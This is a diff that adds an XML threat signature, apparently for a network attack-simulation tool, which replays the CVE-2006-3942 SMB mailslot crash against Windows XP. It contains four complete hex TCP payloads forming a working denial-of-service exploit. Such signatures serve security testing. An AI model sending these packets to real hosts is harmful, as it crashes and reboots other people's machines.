@@ -1,0 +1,123 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="SMB PIPE Server Crash"/>
+    <EngDesc display="true" value="This threat causes a reboot of a Windows XP machine by sending a malformed SMB request.  This is a new flaw unpatched as of yet by microsoft, discovered by Core Security.  SMB is a windows file sharing service and typically listens on port 445."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Corruption"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SMB"/>
+    <Type_Of_Equipment display="true">
+      <item value="Host"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_XP_SP1"/>
+      <item value="Microsoft_Windows_SP2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.security.nnov.ru/files/mswinmailslotex.c"/>
+    <CVEID display="true" value="CVE-2006-3942"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="464d30d05587ad0c5b60f22a03adadca" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632907344159233750"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1155182922" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="N"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="O"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="P"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="Q"/>
+    <NamedVar name="SMBdestPort" type="ImperfectControls.Port" value="null" index="R"/>
+  </Variables>
+  <Loops>
+    <for index="B">
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+    <for index="D">
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+    <for index="F">
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+    <for index="H">
+      <for index="N"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="0000002FFF534D4272000000000000000000000000000000000000000000880500000000000C00024E54204C4D20302E313200" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000048FF534D427300000000080000000000000000000000000000FFFF8805000000000DFF000000FFFF02008805000000000000000000000000010000000B0000006E74007079736D6200" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000058FF534D4275000000001807C80000000000000000000000000000FFFE0008000304FF005800080001002D00005C005C003100370032002E00320032002E0035002E00340036005C00490050004300240000003F3F3F3F3F00" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$SMBdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="00000056FF534D422500000000000100000000000000000000000000000888050008000011000001000004E0FF000000000000000000000000550001005500030001000000000011005C4D41494C534C4F545C4C414E4D414E41" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
